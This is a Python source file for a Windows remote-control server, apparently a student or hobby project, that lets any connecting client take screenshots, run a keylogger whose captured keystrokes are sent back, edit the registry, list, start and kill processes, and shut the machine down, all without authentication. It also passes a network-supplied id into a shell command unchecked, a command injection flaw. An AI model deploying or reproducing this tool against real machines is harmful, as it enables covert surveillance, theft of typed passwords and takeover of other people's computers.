import socket
import threading
import pyautogui
import io
import os
import winreg as wr
from pynput import keyboard
import subprocess
import re
import psutil
import signal

HEADER = 64
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
FORMAT = 'utf-8'

DISCONNECT_MSG = "!DISCONNECT"
SCREENSHOT_MSG = "!SCREENSHOT"
SHUTDOWN_MSG = "!SHUTDOWN"
REGISTRY_MSG = "!REGISTRY"
KEYLOG_MSG = "!KEYLOG"
GETAPP_MSG = "!GETAPP"
KILLAPP_MSG = "!KILLAPP"
PROCESS_MSG = "!PROCESS"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((SERVER, PORT))

keylogger_on = False

def toReg(str):
    if(str == "String"):
        return wr.REG_SZ
    if(str == "Binary"):
        return wr.REG_BINARY
    if(str == "DWORD"):
        return wr.REG_DWORD
    if(str == "QWORD"):
        return wr.REG_QWORD
    if(str == "Multi-String"):
        return wr.REG_MULTI_SZ
    if(str == "Expandable String"):
        return wr.REG_EXPAND_SZ
    return wr.REG_SZ
    

def send(connection, msg):
    message = msg.encode(FORMAT)
    msg_len = str(len(message)).encode(FORMAT) 
    msg_len += (b' '*(HEADER - len(msg_len)))
    connection.send(msg_len)
    connection.send(message)

def receive(connection):
    msg_len = connection.recv(HEADER).decode(FORMAT)
    if msg_len:
        msg_len = int(msg_len)
        msg = connection.recv(msg_len).decode(FORMAT)
        return msg
    return ""

def getValue(path, value_name):
    try:
        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
        value = wr.QueryValueEx(key, value_name)
        wr.CloseKey(key)
        wr.CloseKey(reg)
        return value
    except:
        return False
    
def setValue(path, value_name, dataType, data):
    try:
        dataType = toReg(dataType)
        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
        wr.SetValueEx(key, value_name, 0, dataType, data)
        wr.CloseKey(key)
        wr.CloseKey(reg)
        return True
    except:
        return False
    
def createValue(path, value_name, dataType, data):
    try:
        dataType = toReg(dataType)
        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
        wr.SetValueEx(key, value_name, 0, dataType, data)
        wr.CloseKey(key)
        wr.CloseKey(reg)
        return True
    except:
        return False
    
def deleteValue(path, value_name):
    try:
        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
        wr.DeleteValue(key, value_name)
        wr.CloseKey(key)
        wr.CloseKey(reg)
        return True
    except:
        return False

def createKey(path, newkey):
    try:
        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
        wr.CreateKey(key, newkey)
        wr.CloseKey(key)
        wr.CloseKey(reg)
        return True
    except:
        return False
  
def deleteKey(path, delKey):
    try:
        reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
        key = wr.OpenKey(reg, path, 0, wr.KEY_ALL_ACCESS)
        wr.DeleteKey(key, delKey)
        wr.CloseKey(key)
        wr.CloseKey(reg)
        return True
    except:
        return False

def analyzeRegistry(msg, connection):
    content = msg.split(',')
    # print(content)
    if content[0] == 'GETVAL':
        returnVal = getValue(content[1], content[2])
        if returnVal:
            send(connection, f'The value at path {content[1]} is {returnVal}')
        else: 
            send(connection, f'Cannot get value at path {content[1]}')
    elif content[0] == 'SETVAL':
        returnVal = setValue(content[1], content[2], toReg(content[3]), content[4])
        if returnVal:
            send(connection, f'Value {content[2]} has been set to {content[4]}')
        else:
            send(connection, f'Error while setting value {content[2]}')
    elif content[0] == 'CREATEVAL':
        returnVal = createValue(content[1], content[2], toReg(content[3]), content[4])
        if returnVal:
            send(connection, f'Created value {content[2]}')
        else:
            send(connection, f'Error while creating value {content[2]}')
    elif content[0] == 'DELETEVAL':
        returnVal = deleteValue(content[1], content[2])
        if returnVal:
            send(connection, f'Deleted value {content[2]}')
        else:
            send(connection, f'Error while deleting value {content[2]}')
    elif content[0] == 'CREATEKEY':
        returnVal = createKey(content[1], content[2])
        if returnVal:
            send(connection, f'Created key {content[2]}')
        else:
            send(connection, f'Error while creating key {content[2]}')
    elif content[0] == 'DELETEKEY':
        returnVal = deleteKey(content[1], content[2])
        if returnVal:
            send(connection, f'Deleted key {content[2]}')
        else:
            send(connection, f'Error while deleting key {content[2]}')
    else:
        send(connection, 'Invalid command')

def getProcessList():
    process_list = []
    for proc in psutil.process_iter(['pid', 'name', 'num_threads']):
        try:
            process_info = {
                'pid': proc.info['pid'], # type: ignore
                'name': proc.info['name'], # type: ignore
                'threads': proc.info['num_threads'] # type: ignore
            }
            process_list.append(process_info)
        except psutil.NoSuchProcess:
            pass
    return (process_list, len(process_list)) 

def killProcess(pid):
    try:
        os.kill(pid, signal.SIGTERM)
        return True
    except:
        return False

def startProcess(process_name):
    try:
        # Start the executable app in a non-blocking way
        subprocess.Popen([process_name])
        return True

    except FileNotFoundError:
        print(f"Could not find the executable at {process_name}")
        return False

def analyzeProcess(msg, connection):
    content = msg.split(',')
    if content[0] == "GETPROCESS":
        process_list, list_len = getProcessList()
        send(connection, str(list_len))
        for item in process_list:
            send(connection, str(item["pid"]))
            send(connection, str(item["name"]))
            send(connection, str(item["threads"]))
    elif content[0] == "STARTPROCESS":
        returnVal = startProcess(content[1])
        if returnVal == True:
            send(connection, f'Started process {content[1]}')
        else:
            send(connection, f'Error while starting process {content[1]}')
    elif content[0] == "KILLPROCESS":
        returnVal = killProcess(int(content[1]))
        if returnVal:
            send(connection, f'Killed process with pid {content[1]}')
        else:
            send(connection, f'Error while killing process with pid {content[1]}')
    else:
        send(connection, 'Invalid command')

def sendScreenShot(connection, address):
    print(f"[{address}] !SCREENSHOT")
    screenshot = pyautogui.screenshot()
    screenshotByteIO = io.BytesIO()
    screenshot.save(screenshotByteIO, format='PNG')
    screenshotByte = screenshotByteIO.getvalue()
    connection.send(str(len(screenshotByte)).encode('utf-8').ljust(64))
    connection.sendall(screenshotByte)

def record_keys(connection, address):
    keys_pressed = []

    def on_press(key):
        nonlocal keys_pressed
        try:
            keys_pressed.append((key.char).replace("Key.", ""))
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.space:
                key_char = '<SPACE>'
            elif key == keyboard.Key.enter:
                key_char = '<ENTER>'
            elif isinstance(key, keyboard.KeyCode):
                key_char = str(key.char).replace("Key.", "")
                key_char = '<' + key_char + '>'
            else:
                key_char = str(key).replace("Key.", "")
                key_char = '<' + key_char + '>'
            keys_pressed.append(key_char)
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while (keylogger_on):
        pass
    listener.stop()

    _keylogged = ''.join(keys_pressed)
    print(_keylogged)
    send(connection, _keylogged)

def getAppList():
    cmd = ['powershell', 'gps | where {$_.MainWindowTitle } | select Description,Id,Path,@{Name=\'Threads\';Expression={(Get-Process -Id $_.Id).Threads.Count}}']
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, text=True, check=True)
    process_list = []
    
    for line in proc.stdout.splitlines():
        line = line.strip()
        # print(line)
        pattern = r'(.+?)\s+(\d+)\s+(.+)\s+(\d+)'
        match = re.match(pattern, line)
        if line:
            if match:
                description = match.group(1)
                app_id = match.group(2)
                path = match.group(3)
                threads = match.group(4)
                
                result_dict = {
                    'description': description.strip(),
                    'app_id': app_id,
                    'path': path.strip(),
                    'threads': threads
                }
                process_list.append(result_dict)
            else:
                pass
    return (process_list, len(process_list))

def killApp(app_id, connection):
    cmd = f'powershell "Stop-Process -Id {app_id}"'
    try:
        subprocess.run(cmd, shell=True, check=True)
        send(connection, f"App with ID {app_id} has been killed")
    except:
        send(connection, f"Error while killing app with ID {app_id}")

def sendAppList(connection):
    processes, list_len = getAppList()
    send(connection, str(list_len))
    for item in processes:
        send(connection, item["description"])
        send(connection, item["app_id"])
        send(connection, item["path"])
        send(connection, item["threads"])
    # print("Done sending")

def handle_client(connection, address):
    print(f"New connection initialized - {address}.")
    while True:
        msg = receive(connection)
        if msg == DISCONNECT_MSG:
            print(f"[{address}] - Connection closed")
            break
        elif msg == GETAPP_MSG:
            sendAppList(connection)
        elif msg == KILLAPP_MSG:
            app_id = receive(connection)
            killApp(app_id, connection)
        elif msg == SCREENSHOT_MSG:
            sendScreenShot(connection, address)
        elif msg == SHUTDOWN_MSG:
            os.system("shutdown /s /t 1")
        elif msg == REGISTRY_MSG:
            command = receive(connection)
            analyzeRegistry(command, connection)
        elif msg == PROCESS_MSG:
            command = receive(connection)
            analyzeProcess(command, connection)
        elif msg == KEYLOG_MSG:
            global keylogger_on
            if (not keylogger_on):
                print(f"[{address}] - KEYLOG START")
                keylogger_on = True
                threading.Thread(target=record_keys, args=(connection, address)).start()
            else:
                print(f"[{address}] - KEYLOG END")
                keylogger_on = False
        else:
            print(f"[{address}] {msg}")
    print()
    connection.close()

def start():
    server.listen()
    while True:
        connection, address = server.accept()
        threading.Thread(target=handle_client, args=(connection, address)).start()

# print(f"[SERVER START] {socket.gethostbyname(socket.gethostname())}")
# start()